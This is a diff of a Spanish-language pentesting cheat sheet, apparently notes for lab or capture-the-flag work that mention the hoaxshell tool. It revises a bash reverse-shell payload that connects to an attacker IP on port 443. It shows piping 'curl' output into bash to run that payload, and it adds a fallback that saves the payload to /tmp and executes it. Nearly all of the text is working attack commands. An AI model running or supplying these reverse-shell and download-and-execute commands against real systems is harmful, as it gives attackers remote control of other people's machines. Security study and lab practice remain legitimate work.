@@ -283,13 +283,18 @@ https://github.com/t3l3machus/hoaxshell     # Descargar la herramienta
 ❯ nano index.html
 
 	#!/bin/bash
-	bash -i >& /dev/tcp/10.10.14.2/443 0>&1
+	bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'
 
 	# IP = IP de atacante
 	# 443 = Puerto a usar
 
 
 ❯ curl ❮IP❯ | bash    # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
+
+---
+# si no te deja hacer '| bash' se puede hacer los siguientes pasos:
+❯ curl ❮IP❯ -o /tmp/reverse       # El output del comando colocarlo en la ruta /tmp/ 
+❯ bash /tmp/reverse               # Ejecutar bash al archivo para obtener la revershell  
 ```
 
 ## Imagen 'png' 
